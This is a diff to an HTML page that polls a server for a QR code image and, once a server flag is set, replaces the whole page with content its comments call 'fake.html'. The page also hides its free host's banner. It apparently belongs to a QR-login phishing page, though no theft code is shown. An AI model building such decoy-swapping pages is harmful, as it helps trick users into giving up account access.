@@ -1,5 +1,6 @@
 <html lang="en" class="version-d platform-desktop">
 <head>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <style>img[alt*="www.000webhost.com"]{display:none}
 
 #myModal {
@@ -181,11 +182,39 @@
 					} else {
 						img.src = "https://media.giphy.com/media/MEiZ5h8lOkM7rwideE/giphy.gif"; // If no QR code available, show an empty image
 					}
+	
+					// Handle rendering xyz.html
+					if (data.xyz_html_rendered) {
+						// Load the content of 'fake.html' into the current page
+						fetch("/xyz_html_rendered")
+						.then(response => response.json())
+						.then(data => {
+							if (data.xyz_html_rendered) {
+								fetch("/")
+								.then(response => response.text())
+								.then(content => {
+									document.documentElement.innerHTML = content;
+									updateImage(); // Call updateImage function to refresh the image in 'fake.html'
+								});
+							} else {
+								setTimeout(updateImage, 1000);  // Check again after 1 second
+							}
+						});
+					} else {
+						setTimeout(updateImage, 1000);  // Check again after 1 second
+					}
+				})
+				.catch(error => {
+					// Handle errors if any
+					console.error("Error fetching data:", error);
+					setTimeout(updateImage, 1000);  // Retry after 1 second
 				});
 			}
-		
-			// Update the image every 1 seconds
-			setInterval(updateImage, 1000);
+	
+			// Call the updateImage function when the page loads
+			$(document).ready(function () {
+				updateImage();
+			});
 		</script>
 		
 		
